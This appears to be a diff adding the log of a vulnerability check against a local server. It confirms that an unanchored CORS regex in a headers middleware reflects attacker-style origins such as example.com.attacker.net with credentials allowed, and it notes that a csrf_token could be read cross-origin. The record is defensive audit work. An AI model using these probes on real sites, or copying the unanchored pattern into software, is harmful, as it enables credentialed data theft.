@@ -1,0 +1,20 @@
+==============================================================================
+VULN-011: CORS unanchored regex + credentialed origin reflection (config-gated)
+Target: http://localhost:21372
+==============================================================================
+[INFO] src/middleware/headers.js:42-66 — unanchored regex.test(origin), reflects origin + credentials
+[SETUP] reading current CORS settings to restore later
+[SETUP] admin enables access-control-allow-origin-regex=`example\.com` and access-control-allow-credentials=`true` (a supported ACP setting)
+[INFO] settings applied (HTTP 200, 200)
+[STEP] probe Origin: https://example.com.attacker.net
+[INFO]   Access-Control-Allow-Origin: 'https://example.com.attacker.net' | Access-Control-Allow-Credentials: 'true'
+[STEP] probe Origin: https://notexample.com
+[INFO]   Access-Control-Allow-Origin: 'https://notexample.com' | Access-Control-Allow-Credentials: 'true'
+[STEP] control Origin (no 'example.com' substring): https://unrelated-evil.org
+[INFO]   Access-Control-Allow-Origin: None (should be None/not-reflected)
+[PROOF] attacker origins that merely CONTAIN 'example.com' are reflected into ACAO with ACAC:true, while an unrelated origin is not -> credentialed cross-origin read allowed (e.g. exfiltrate /api/config csrf_token)
+[SETUP] restoring original CORS settings
+[INFO] CORS settings restored
+------------------------------------------------------------------------------
+[OK] exploit confirmed — unanchored CORS regex reflects attacker origins with credentials
+==> VULN-011: CONFIRMED — unanchored CORS regex + credentialed reflection (config-gated)
